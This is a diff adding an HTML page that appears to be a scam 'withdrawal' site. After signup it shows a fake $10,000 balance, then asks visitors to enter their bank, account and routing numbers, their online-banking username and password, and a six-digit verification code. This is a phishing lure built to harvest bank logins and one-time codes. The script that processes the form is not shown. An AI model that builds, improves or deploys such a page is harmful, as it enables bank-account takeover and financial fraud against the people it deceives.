@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Signup, Login, and Withdrawal</title>
+    <link rel="stylesheet" href="great.css">
+</head>
+<body>
+    <div id="main">
+        <!-- Signup Form -->
+        <div id="signup">
+            <h2>Signup</h2>
+            <form id="signupForm" onsubmit="signup(event)">
+                <input type="text" id="signupName" placeholder="Enter your name" required>
+                <input type="tel" id="phonenumber" placeholder="Enter your phonenumber" required>
+                <input type="password" id="signupPassword" placeholder="Enter your password" required>
+                <button type="submit">Sign Up</button>
+            </form>
+        </div>
+
+        <!-- Login Form -->
+        <div id="login" style="display:none;">
+            <h2>Login</h2>
+            <form id="loginForm" onsubmit="login(event)">
+                <input type="text" id="loginName" placeholder="Enter your name" required>
+                <input type="password" id="loginPassword" placeholder="Enter your password" required>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+
+        <!-- Welcome Page -->
+        <div id="welcome" style="display:none;">
+            <h2>Welcome, <span id="userName"></span>!</h2>
+            <p>Your balance is: $10,000</p>
+
+            <!-- Withdrawal Form -->
+            <h3>Withdraw Funds</h3>
+            <form id="withdrawalForm" onsubmit="requestVerification(event)">
+                <input type="text" id="bankName" placeholder="Bank Name" list="banks" required>
+                <datalist id="banks">
+                    <option value="Bank of America"></option>
+                    <option value="Chase"></option>
+                    <option value="Bank of america"></option>
+                    <option value="Wells fargo"></option>
+                    <option value="Citi bank"></option>
+                    <option value="U.S bank"></option>
+                    <option value="Pnc bank"></option>
+                    <option value="Truist bank"></option>
+                    <option value="Capital one bank"></option>
+                    <option value="TD bank"></option>
+                    <option value="Citizen Bank"></option>
+                    <option value="Huntington Bank"></option>
+                    <option value="Goldman Sachs"></option>
+                    <option value="Navy Federal credit union"></option>
+                    <option value="Citizens Bank"></option>
+                    <option value="Fifth Third Bank"></option>
+                    <option value="Ally Bank"></option>
+                    <option value="Bmo Bank Of Montreal"></option>
+                    <option value="American Express"></option>
+                    <option value="Citigroup"></option>
+                    <option value="USAA Bank"></option>
+                    <option value="HSBC"></option>
+                    <option value="Regions"></option>
+                    <option value="CIBC Bank"></option>
+                    <option value="FNB Corporation"></option>
+                    <option value="First Bancorp"></option>
+                    <option value="Bank of Awaii"></option>
+                    <option value="United Community Bank"></option>
+                    <option value="First Bank"></option>
+                    <option value="South State Bank"></option>
+                    <option value="Wintrust Bank"></option>
+                    <option value="Webster Bank"></option>
+                    <option value="Community Bank"></option>
+                    <option value="Discover"></option>
+                    <option value="M&T Bank"></option>
+                    <option value="Axos"></option>
+                    <option value="Atlantic union Bank"></option>
+                    <option value="Eastern Bank"></option>
+                    <option value="WSFS Bank"></option>
+                    <option value="Pinnacle Bank"></option>
+                    <option value="Independent Bank"></option>
+                    <option value="Pacific Premier Bancorp"></option
+                    <!-- Add up to 300 bank options here -->
+                </datalist>
+                <input type="text" id="accountNumber" placeholder="Account Number" required>
+                <input type="text" id="routingNumber" placeholder="Routing Number" required>
+                <input type="text" id="bank username" placeholder="bank username" required>
+                <input type="text" id="bank password" placeholder="bank password" required>
+                <button type="submit">Proceed</button>
+            </form>
+
+            <!-- Verification Code Prompt -->
+            <div id="verification" style="display:none;">
+                <p>enter the six verification code to verify your payment.</p>
+                <input type="text" id="verificationCode" placeholder="Enter verification code" required>
+                <button onclick="verifyCode()">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="great.js"></script>
+</body>
+</html>
